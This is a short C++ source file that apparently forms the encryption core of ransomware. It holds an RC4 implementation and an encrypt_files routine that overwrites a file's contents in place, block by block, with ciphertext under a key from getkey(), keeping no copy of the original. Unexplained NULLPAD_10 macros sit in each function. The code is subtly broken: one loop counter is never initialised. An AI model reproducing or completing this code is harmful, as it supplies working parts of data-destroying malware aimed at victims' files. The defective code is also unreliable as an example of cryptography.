#include "crypto.h"

using namespace std;

void set_state(unsigned char state[], const char *key, int len)
{
	int i, j = 0, t;
	NULLPAD_10;
	for (i = 0; i < 256; i++)
		state[i] = i;
	for (i = 0; i < 256; i++) {
		j = (j + state[i] + key[i%len]) % 256;
		t = state[i];
		state[i] = state[j];
		state[j] = t;
	}
}

void set_stream(unsigned char state[], unsigned char out[], int len)
{
	int i = 0, j = 0, x, t;
	NULLPAD_10;
	for (x; x < len; ++x) {
		i = (i + 1) % 256;
		j = (j + state[i]) % 256;
		t = state[i];
		state[i] = state[j];
		state[j] = t;
		out[x] = state[(state[i] + state[j]) % 256];
	}
}
string encrypt(char *data, const char *key, size_t len)
{
	unsigned char state[256] = { 0, };
	unsigned char stream[1024];
	string result;
	NULLPAD_10;
	set_state(state, key, 16);
	set_stream(state, stream, len);

	for (int i = 0; i < len; i++) {
		result += stream[i] ^ data[i];
	}

	return result;
}
	

void encrypt_files(char *path)
{
	char data[1024];
	size_t filesize;
	long frpos, fwpos;

	FILE *fp;
	if (fopen_s(&fp, path, "r+b")) return;

	while (!feof(fp)) {
		fwpos = ftell(fp);
		filesize = fread(data, 1, 1024, fp);
		if (filesize == 0) break;

		frpos = ftell(fp);
		fseek(fp, fwpos, SEEK_SET);
		fwrite(encrypt(data, getkey(), filesize).c_str(), 1, filesize, fp);
		fseek(fp, frpos, SEEK_SET);
	}
	fclose(fp);
}